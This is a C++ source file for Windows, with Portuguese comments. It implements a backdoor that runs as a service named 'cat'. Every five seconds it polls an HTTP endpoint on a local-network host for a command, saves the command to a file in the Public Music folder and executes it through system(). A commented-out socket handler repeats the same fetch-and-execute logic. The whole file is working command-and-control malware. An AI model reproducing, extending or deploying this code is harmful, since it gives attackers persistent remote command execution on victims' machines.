#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <fstream>

// compilar com -lwininet e -lws2_32
#define SERVICE_NAME "cat"

std::string GetURLContent(const char* url) {
    std::string content;
    HINTERNET hInternet = InternetOpenA("MyApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    
    if (hInternet) {
        HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        
        if (hConnect) {
            DWORD bytesRead;
            char buffer[4096];
            
            while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                content.append(buffer, bytesRead);
            }
            
            InternetCloseHandle(hConnect);
        }
        
        InternetCloseHandle(hInternet);
    }
    
    return content;
}

// DWORD WINAPI RequestHandler(LPVOID lpParam) {
//     SOCKET clientSocket = (SOCKET)lpParam;

//     char buffer[4096];
//     int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);

//     if (bytesRead > 0) {
//         const char* url = "http://192.168.0.4:5000/sendCommand";
//         std::string urlContent = GetURLContent(url);
//         std::ofstream file("C:\\Users\\Public\\Music\\command.txt");
//         file << urlContent;
//         file.close();
//         system(GetURLContent(url).c_str());
//     }

//     closesocket(clientSocket);
//     return 0;  // Return a DWORD value
// }

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    while (true) {
        // Polling: busca comando a cada 5 segundos
        std::string command = GetURLContent("http://192.168.0.2:5000/sendCommand");
        
        if (!command.empty() && command != "No commands found.") {
            std::cout << "Comando recebido: " << command << std::endl;
            std::ofstream file("C:\\Users\\Public\\Music\\command.txt");
            file << command;
            file.close();
            system(command.c_str());
        }
        
        Sleep(5000);  // Aguarda 5 segundos antes de tentar novamente
    }
    
    WSACleanup();
}

int main(int argc, char* argv[]) {
    SERVICE_TABLE_ENTRY serviceTable[] =
    {
        { (LPCSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    StartServiceCtrlDispatcher(serviceTable);
    return 0;
}